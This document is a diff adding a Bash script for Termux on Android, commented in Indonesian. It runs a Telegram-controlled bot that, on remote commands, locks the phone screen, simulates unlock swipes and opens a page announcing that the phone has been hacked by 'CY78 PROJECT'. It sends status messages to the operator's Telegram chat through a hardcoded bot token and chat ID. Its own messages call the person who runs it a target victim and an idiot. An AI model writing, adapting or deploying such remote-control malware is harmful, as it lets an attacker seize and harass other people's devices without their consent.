@@ -1,0 +1,83 @@
+#!/bin/bash
+
+TOKEN="7433283640:AAEj2T-2_0gNNgk0-OlrFx5d-3aFJ4QCiO4"
+CHAT_ID="5951232585"
+HTML_FILE="/data/data/com.termux/files/home/index.html"
+GAMBAR_URL="https://i.ibb.co.com/wyjW6Rs/Proyek-Baru-31-E087037.png"
+
+# Fungsi untuk mengunci layar
+lock_screen() {
+    input keyevent 26  # Kunci layar (Power)
+    termux-toast "Layar Dikunci!"
+    send_telegram "Layar telah dikunci! 🔒"
+}
+
+# Fungsi untuk membuka layar
+unlock_screen() {
+    input keyevent 26  # Hidupkan layar
+    input touchscreen swipe 500 1500 500 500  # Geser ke atas (buka kunci)
+    termux-toast "Layar Dibuka!"
+    send_telegram "Layar berhasil dibuka! 🔓"
+    show_html
+}
+
+# Fungsi untuk menampilkan gambar HTML
+show_html() {
+    cat <<EOF > $HTML_FILE
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proyek Baru</title>
+    <style>
+        body { text-align: center; font-family: Arial; }
+        img { max-width: 100%; height: auto; }
+    </style>
+</head>
+<body>
+    <h1>HP ANDA DI KUNCI HAHAHAHHA DI RETAS OLEH CY78 PROJECT</h1>
+    <img src="$GAMBAR_URL" alt="Proyek Baru">
+</body>
+</html>
+EOF
+    termux-open $HTML_FILE
+    send_telegram "Menampilkan gambar HTML 📸"
+}
+
+# Fungsi untuk mengirim pesan ke Telegram
+send_telegram() {
+    MESSAGE="$1"
+    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
+    -d "chat_id=$CHAT_ID&text=$MESSAGE&parse_mode=HTML"
+}
+
+# Jalankan Bot Telegram
+start_bot() {
+    send_telegram "TARGET KORBAN MASUK TERMUX SIAP SIAP DI KUNCI LAYAR HP HAHAHHAHAH YOU ARE IDIOIT 🚀"
+    while true; do
+        UPDATES=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates" | jq -r '.result[-1].message.text')
+        
+        case "$UPDATES" in
+            "/lock")
+                lock_screen
+                ;;
+            "/unlock")
+                unlock_screen
+                ;;
+            "/show")
+                show_html
+                ;;
+            "/start")
+                send_telegram "CY78 PROJECT MELUNCUR MENGKUNCIKAN HP ORAMG MENGGUNAKAN TERMUX HAHAHHAHA 🚀\nPilihan:\n🔒 /lock - Kunci Layar\n🔓 /unlock - Buka Layar\n📸 /show - Tampilkan Gambar"
+                ;;
+            *)
+                send_telegram "Perintah tidak dikenal. ❌"
+                ;;
+        esac
+        sleep 55
+    done
+}
+
+# Jalankan bot
+start_bot
